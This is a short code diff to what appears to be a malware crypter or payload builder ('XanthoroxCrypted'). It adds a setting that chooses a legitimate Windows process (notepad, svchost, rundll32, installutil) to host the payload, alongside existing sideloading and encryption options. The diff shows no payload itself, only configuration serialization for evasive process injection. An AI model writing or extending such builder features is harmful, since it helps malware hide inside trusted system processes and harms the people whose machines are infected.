@@ -57,6 +57,7 @@ namespace XanthoroxCrypted.Core
         public byte SideloadFormatType { get; set; }
         public byte EncAlgorithm { get; set; }
         public byte ResearchPackage { get; set; }
+        public byte HostProcess { get; set; }  // 0=notepad,1=svchost,2=rundll32,3=installutil
 
         // Builder-only toggles (not in StubConfig)
         public bool Inflate { get; set; }
@@ -105,7 +106,8 @@ namespace XanthoroxCrypted.Core
             config[36] = SideloadFormatType;
             config[37] = EncAlgorithm;
             config[38] = ResearchPackage;
-            // bytes 39-43 = padding (zeroed)
+            config[39] = HostProcess;
+            // bytes 40-43 = padding (zeroed)
             return config;
         }
     }
